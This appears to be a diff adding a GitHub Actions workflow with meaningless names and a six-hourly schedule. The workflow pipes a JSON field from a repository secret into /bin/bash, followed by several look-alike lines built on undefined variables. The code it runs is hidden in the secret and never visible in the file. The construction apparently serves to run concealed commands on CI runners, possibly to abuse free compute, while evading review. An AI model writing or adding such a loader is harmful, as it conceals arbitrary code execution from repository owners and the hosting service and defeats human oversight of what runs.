@@ -1,0 +1,22 @@
+name: haotiejian5687
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: haotiejian5687
+        env:
+          wyy2000: ${{ secrets.wyy2000 }}
+        run: |
+          echo $wyy2000 | jq -r .iqx3086 | /bin/bash
+          echo $mnwdd10 | jq -r .mktu62526 | /bin/bash
+          echo $c055 | jq -r .lc27765 | /bin/bash
+          echo $quo69007 | jq -r .e50 | /bin/bash
+          echo $cq556 | jq -r .qsly95013 | /bin/bash
+          echo $inbyw4762 | jq -r .l85512 | /bin/bash
+
